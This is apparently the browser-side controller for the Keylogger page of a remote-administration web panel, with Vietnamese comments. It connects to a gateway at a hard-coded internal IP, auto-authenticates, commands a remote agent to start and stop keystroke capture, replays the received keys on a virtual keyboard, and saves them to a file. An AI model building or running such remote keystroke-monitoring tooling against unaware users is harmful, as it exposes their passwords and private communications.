/**
 * Path: assets/js/keylog.js
 * Nhiệm vụ: Xử lý logic cho trang Keylogger, visual hiệu ứng phím và lưu file.
 */

// Lưu ý: Đường dẫn import dựa trên giả định file nằm trong assets/js 
// và các module nằm trong thư mục modules/ ở root. 
// Nếu cấu trúc khác, hãy điều chỉnh đường dẫn này (ví dụ: ../../gateway.js).
import { CONFIG } from '../../modules/config.js';
import { Gateway } from '../../modules/gateway.js';

class KeyloggerUI {
    constructor() {
        // State
        this.isLogging = false;
        this.logBuffer = ""; // Biến lưu toàn bộ nội dung keylog
        this.serverIP = '10.148.31.96'; // IP mặc định hoặc lấy từ localStorage nếu có

        // DOM Elements
        this.displayInput = document.querySelector('.key-display');
        this.btnMenu = document.querySelector('.action-buttons button:nth-child(1)');
        this.btnStart = document.querySelector('.action-buttons button:nth-child(2)');
        this.btnStop = document.querySelector('.action-buttons button:nth-child(3)');
        this.btnSave = document.querySelector('.action-buttons button:nth-child(4)');
        this.keys = document.querySelectorAll('.key');

        // Init Gateway
        this.gateway = new Gateway({
            onConnected: () => this.logSystem("Connected to Gateway."),
            onDisconnected: () => this.logSystem("Disconnected."),
            onKeylog: (data, sender) => this.handleIncomingKey(data, sender),
            onError: (err) => console.error(err)
        });

        this.init();
    }

    init() {
        // 1. Kết nối Gateway ngay khi load trang
        this.gateway.connect(this.serverIP);

        // 2. Gán sự kiện cho các nút
        this.btnStart.onclick = () => this.startKeylog();
        this.btnStop.onclick = () => this.stopKeylog();
        this.btnSave.onclick = () => this.saveToDevice();

        // 3. Inject CSS để phục vụ việc "nháy đèn" phím khi nhận tín hiệu
        // (Làm thế này để không phải sửa file css gốc)
        this.injectActiveStyle();
        
        this.logSystem("Ready. Press 'Start keylog' to begin.");
    }

    // --- Command Functions ---

    startKeylog() {
        if (!this.gateway.isAuthenticated) {
            // Tự động Auth nếu chưa đăng nhập (dùng hash mặc định trong config)
            this.gateway.authenticate();
        }

        this.isLogging = true;
        this.logSystem(">>> Keylogger STARTED...");
        
        // Gửi lệnh Start Keylog tới Server/Agent
        // interval: 0.1 để nhận dữ liệu gần như realtime cho hiệu ứng mượt
        this.gateway.send(CONFIG.CMD.START_KEYLOG, JSON.stringify({ interval: 0.1 }));
        
        this.btnStart.style.backgroundColor = "#22c55e"; // Green signals active
        this.btnStart.innerText = "Monitoring...";
    }

    stopKeylog() {
        this.isLogging = false;
        this.logSystem(">>> Keylogger STOPPED.");
        
        this.gateway.send(CONFIG.CMD.STOP_KEYLOG, "");
        
        this.btnStart.style.backgroundColor = ""; // Reset color
        this.btnStart.innerText = "Start keylog";
    }

    // --- Core Logic: Xử lý dữ liệu nhận về ---

    /**
     * Xử lý luồng data nhận được từ Socket
     * @param {string} dataString - Chuỗi ký tự nhận được (có thể là 1 hoặc nhiều ký tự)
     */
    handleIncomingKey(dataString, senderId) {
        if (!this.isLogging) return;

        // Cắt chuỗi thành mảng các ký tự để xử lý từng phím
        const chars = dataString.split('');

        chars.forEach(char => {
            // 1. Lưu vào buffer (để tải file)
            this.logBuffer += char;

            // 2. Hiển thị lên thanh Input màu xám
            this.updateDisplay(char);

            // 3. Hiệu ứng Visual trên bàn phím ảo
            this.visualizeKey(char);
        });
    }

    updateDisplay(char) {
        // Giả lập hành vi nhập liệu cơ bản
        if (char === '\b' || char === 'Backspace') {
            this.displayInput.value = this.displayInput.value.slice(0, -1);
        } else if (char === '\n' || char === 'Enter') {
            // Input type text không hiển thị xuống dòng, ta có thể thay bằng ký hiệu
            // hoặc giữ nguyên nếu muốn save file đúng định dạng.
            // Ở đây ta hiển thị ký hiệu để người dùng biết đã xuống dòng.
            this.displayInput.value += "↵ "; 
        } else if (char.length === 1) {
            this.displayInput.value += char;
        }
        
        // Auto scroll input sang phải cùng
        this.displayInput.scrollLeft = this.displayInput.scrollWidth;
    }

    visualizeKey(char) {
        let targetKey = null;
        const lowerChar = char.toLowerCase();

        // Mapping ký tự đặc biệt sang Text hiển thị trên bàn phím HTML
        const specialMap = {
            '\n': 'enter',
            '\r': 'enter',
            ' ': 'space', // Space trong HTML là div rỗng, ta xử lý riêng bên dưới
            '\t': 'tab',
            '\b': 'backspace',
            'backspace': 'backspace'
        };

        // Tìm phím trên DOM
        for (let key of this.keys) {
            let keyText = key.innerText.toLowerCase().trim();
            
            // Xử lý phím Space (trong HTML là div rỗng class k-6-25)
            if (char === ' ' && keyText === '' && key.classList.contains('k-6-25')) {
                targetKey = key;
                break;
            }

            // Xử lý các phím ký tự thường và phím chức năng
            if (keyText === lowerChar || keyText === specialMap[lowerChar]) {
                targetKey = key;
                break;
            }
        }

        // Nếu tìm thấy phím, kích hoạt hiệu ứng
        if (targetKey) {
            targetKey.classList.add('active-simulation');
            setTimeout(() => {
                targetKey.classList.remove('active-simulation');
            }, 150); // Nháy trong 150ms
        }
    }

    // --- File Operations ---

    saveToDevice() {
        if (!this.logBuffer) {
            alert("Chưa có dữ liệu để lưu!");
            return;
        }

        const blob = new Blob([this.logBuffer], { type: "text/plain" });
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        
        const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
        a.href = url;
        a.download = `simulation_log_${timestamp}.txt`;
        document.body.appendChild(a);
        a.click();
        
        document.body.removeChild(a);
        URL.revokeObjectURL(url);

        // ✅ CLEAR LOG SAU KHI SAVE
        this.logBuffer = "";
        this.displayInput.value = "";
        this.mockIndex = 0;

        this.logSystem(">>> Log saved & cleared.");
    }

    // --- Helpers ---

    logSystem(msg) {
        console.log(`[KeylogUI] ${msg}`);
        // Có thể hiển thị thông báo lên UI nếu cần
    }

    injectActiveStyle() {
        const style = document.createElement('style');
        style.innerHTML = `
            .key.active-simulation {
                background-color: #E57D36 !important;
                color: #fff !important;
                transform: translateY(3px);
                box-shadow: none !important;
                transition: all 0.05s ease;
            }
        `;
        document.head.appendChild(style);
    }
}

// Khởi chạy khi DOM load xong
document.addEventListener('DOMContentLoaded', () => {
    window.keyloggerApp = new KeyloggerUI();
});